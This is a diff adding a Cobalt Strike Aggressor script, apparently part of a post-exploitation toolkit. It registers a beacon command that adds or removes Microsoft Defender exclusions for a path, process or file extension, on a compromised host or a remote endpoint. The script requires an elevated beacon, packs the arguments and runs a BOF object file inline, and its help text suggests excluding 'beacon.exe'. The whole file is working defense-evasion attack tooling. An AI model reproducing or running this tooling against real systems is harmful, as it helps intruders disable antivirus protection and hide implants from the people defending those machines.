@@ -1,0 +1,101 @@
+beacon_command_register(
+	"cGenerateDefenderExclusion", 
+	"Generate Defender exclusions.", 
+	"cGenerateDefenderExclusion (add|remove) (path|process|extension) [endpoint]");
+
+
+sub cGenerateDefenderExclusionError 
+{
+    local('$errorString');
+	$errorString  =  "\n";
+	$errorString .= "You must supply proper arguments:\n";
+	$errorString .= "Argument 1: Exclusion behaviors\n";
+    $errorString .= "\tAdd: Add an exception\n";
+	$errorString .= "\tRemove: Remove an exception\n";
+    $errorString .= "\n";
+    $errorString .= "Argument 2: Type of exclusion\n";
+    $errorString .= "\tPath: A path on the remote system to create the exclusion for\n";
+    $errorString .= "\tExtension: An extension on the remote system to create the exclusion for\n";
+    $errorString .= "\tProcess: A process name on the remote system to create the exclusion for\n\n";
+    $errorString .= "Argument 3: Exclusion name\n";
+    $errorString .= "\t E.g beacon.exe\n";
+    $errorString .= "\n";
+    $errorString .= "Argument 4: Remote system [OPTIONAL]\n";
+    $errorString .= "\t E.g randomserver.domain.local";
+		
+	berror($1, $errorString);
+
+	return;
+}
+
+
+alias cGenerateDefenderExclusion 
+{
+	local('$handle $args $data');
+
+    if (!-isadmin $1)
+    {
+        berror($1, "This beacon is not in an elevated context.");
+
+        return;
+    }
+
+	if ( size(@_) < 4 )
+	{
+		berror($1, cGenerateDefenderExclusionError($1));
+		
+        return;
+	}
+
+    local('%methods %optiontypes');
+    %methods['add'] = 1;
+    %methods['remove'] = 2;
+    %optiontypes = %(path => 1, extension => 2, process => 3);
+
+
+    if (lc($2) !in keys(%methods))
+    {
+        cGenerateDefenderExclusionError($1);
+
+        return;
+    }
+
+    if (lc($3) !in keys(%optiontypes))
+    {
+        cGenerateDefenderExclusionError($1);
+
+        return;
+    }
+
+    if (size(@_) == 4)
+    {
+        $args = bof_pack($1, "iiZ", %methods[lc($2)], %optiontypes[lc($3)], $4);
+    }
+    else
+    {
+        $args = bof_pack($1, "iiZZ", %methods[lc($2)], %optiontypes[lc($3)], $4, $5);
+    }
+
+	if ( barch($1) eq "x86" )
+    {
+        $handle = openf(script_resource("cGenerateDefenderExclusion.x86.o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+    else if ( barch($1) eq "x64" )
+    {
+        $handle = openf(script_resource("cGenerateDefenderExclusion.x64.o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+
+        beacon_inline_execute($1, $data, "go", $args);
+    }
+    else
+    {
+        berror($1, "The architecture of the process supplied does not match expectations");
+        
+        return;
+    }
+}
